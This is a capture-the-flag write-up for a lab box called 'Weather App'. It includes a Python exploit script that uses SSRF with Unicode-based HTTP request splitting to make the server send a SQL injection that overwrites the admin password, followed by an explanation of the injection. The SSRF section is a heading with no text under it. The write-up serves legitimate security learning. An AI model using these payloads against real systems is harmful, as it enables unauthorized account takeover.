# Weather App

This was a hard box for me. I was unable to find the correct SQL query to inject in order to be able to update the admin password.
While reading a write up on this box I also saw the SSRF trick that was needed in order to trick the server in to registering a user on your behalf. 
Don't think I would have been able to figure that one out on my own. 

### Python script to pwn the box

```python3
import requests

url = "http://localhost:1337"
username = "admin"
password = "123') ON CONFLICT(username) DO UPDATE SET password = '123'; --"

url_encoded_password = password.replace(" ", "\uFF20").replace("'","%27").replace('""', "%22")
length = len(url_encoded_password) + len(username) + 19

endpoint = "127.0.0.1/\uFF20HTTP/1.1\uFF0D\uFF0A"
endpoint += "Host:\uFF20127.0.0.1\uFF0D\uFF0A\uFF0D\uFF0A"
endpoint += "POST\uFF20/register\uFF20HTTP/1.1\uFF0D\uFF0A"
endpoint += "Host:\uFF20127.0.0.1\uFF0D\uFF0A"
endpoint += "Content-Type:\uFF20application/x-www-form-urlencoded\uFF0D\uFF0A"
endpoint += "Content-Length:\uFF20"+str(length)+"\uFF0D\uFF0A\uFF0D\uFF0A"
endpoint += "username="+username+"&password="+url_encoded_password+"\uFF0D\uFF0A\uFF0D\uFF0A"
endpoint += "GET\uFF20"

data = {"endpoint": endpoint, "city": "bla", "country": "bla"}

response = requests.post(url+"/api/weather", data=data)
```

### How the SQL exploit works

- The /register endpoint is vulnerable to a SQL injection but it only allows requests from `127.0.0.1`. So we have to trick the server in to sending the POST request with the SQL injection.
- The flag will only be visible if we log in with the `admin` username, so we have to change the password for the `admin` user.
- Sending a POST request with `username="admin"&password="123') ON CONFLICT(username) DO UPDATE SET password = '123'; --"` will do the trick. The complete query that the server recieves will look something like this `INSERT INTO users (username, password) VALUES (‘admin’, ‘123’) ON CONFLICT(username) DO UPDATE SET password = ‘123’; --`
- - the `username` is set to be UNIQUE, so the query will fail due to the UNIQUE clause. 
- - We then tell the SQLLite server to update the password if there is a conflict in the `username` column. 
- - `--` is a line comment, it tells SQL to ignore the rest of the query.

### How the SSRF exploit works
